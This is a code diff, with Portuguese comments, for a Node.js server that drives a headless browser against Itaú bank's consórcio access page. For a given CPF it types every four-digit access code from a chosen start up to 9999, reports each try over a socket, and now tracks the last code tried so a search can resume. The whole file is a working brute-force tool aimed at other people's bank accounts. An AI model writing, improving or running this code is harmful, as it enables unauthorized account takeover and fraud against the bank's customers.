@@ -398,6 +398,8 @@ const io = socketIO(server);
 app.use(express.json());
 app.use(cors());
 
+let lastAttempt = ''; // Variável para armazenar o último código tentado
+
 app.post('/api/consultar', async (req, res) => {
   const { cpf, codeStart } = req.body;
 
@@ -408,7 +410,7 @@ app.post('/api/consultar', async (req, res) => {
   let browser;
   try {
     browser = await puppeteer.launch({
-      headless: "new", // Para facilitar o debug, o navegador será exibido
+      headless: "new",
       args: [
         '--no-sandbox',
         '--disable-setuid-sandbox',
@@ -423,25 +425,17 @@ app.post('/api/consultar', async (req, res) => {
       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36'
     );
 
-    console.log('Acessando página...');
     await page.goto('https://www.itau.com.br/servicos/mais-acessos', {
       waitUntil: 'networkidle2',
     });
 
-    // Aceitar cookies
-    console.log('Aceitando cookies...');
     try {
       await page.waitForSelector('button[id="itau-cookie-consent-banner-accept-cookies-btn"]', {
         visible: true,
       });
       await page.click('button[id="itau-cookie-consent-banner-accept-cookies-btn"]');
-      console.log('Cookies aceitos.');
-    } catch (err) {
-      console.warn('Botão de cookies não encontrado. Continuando...');
-    }
+    } catch {}
 
-    // Abrir modal de login
-    console.log('Abrindo modal de login...');
     await page.waitForSelector('button[id="open-consorcio-modal"]', { visible: true });
     await page.click('button[id="open-consorcio-modal"]');
 
@@ -452,21 +446,17 @@ app.post('/api/consultar', async (req, res) => {
     let correctCode = '';
     const startCode = parseInt(codeStart);
 
-    // Loop para testar códigos
-    console.log('Iniciando loop de tentativas...');
     for (let code = startCode; code <= 9999; code++) {
-      const accessCode = code.toString().padStart(4, '0');
+      lastAttempt = code.toString().padStart(4, '0'); // Atualiza o último código tentado
       await page.evaluate(() => (document.querySelector('input[id=consorcio-codigo-acesso]').value = ''));
-      await page.type('input[id=consorcio-codigo-acesso]', accessCode, { delay: 150 });
+      await page.type('input[id=consorcio-codigo-acesso]', lastAttempt, { delay: 150 });
 
-      console.log(`Tentando código: ${accessCode}`);
+      console.log(`Tentando código: ${lastAttempt}`);
       await page.click('button.btn-more-access.primary[type="submit"]');
       await page.waitForTimeout(3000);
 
-      io.emit('attempt', { code: accessCode, status: 'Tentativa realizada' });
+      io.emit('attempt', { code: lastAttempt, status: 'Tentativa realizada' });
 
-      // Monitorar e fechar abas abertas para códigos inválidos
-      const targets = await browser.targets();
       const pages = await browser.pages();
 
       if (pages.length > 1) {
@@ -485,26 +475,24 @@ app.post('/api/consultar', async (req, res) => {
 
         if (loginResult === 'success') {
           found = true;
-          correctCode = accessCode;
-          io.emit('attempt', { code: accessCode, status: 'Código correto encontrado' });
+          correctCode = lastAttempt;
+          io.emit('attempt', { code: lastAttempt, status: 'Código correto encontrado' });
           console.log(`Código de acesso correto encontrado: ${correctCode}`);
           break;
         }
 
-        // Fechar aba se código for inválido
-        console.log('Fechando aba criada para código inválido...');
         await lastPage.close();
       }
     }
 
     if (found) {
-      res.send(`Código de acesso correto encontrado: ${correctCode}`);
+      res.send({ message: `Código de acesso correto encontrado: ${correctCode}`, lastAttempt });
     } else {
-      res.send('Nenhum código correto encontrado.');
+      res.send({ message: 'Nenhum código correto encontrado.', lastAttempt });
     }
   } catch (error) {
     console.error('Erro durante o processo:', error.message);
-    res.status(500).send('Erro ao processar a solicitação.');
+    res.status(500).send({ message: 'Erro ao processar a solicitação.', lastAttempt });
   } finally {
     if (browser) {
       await browser.close();
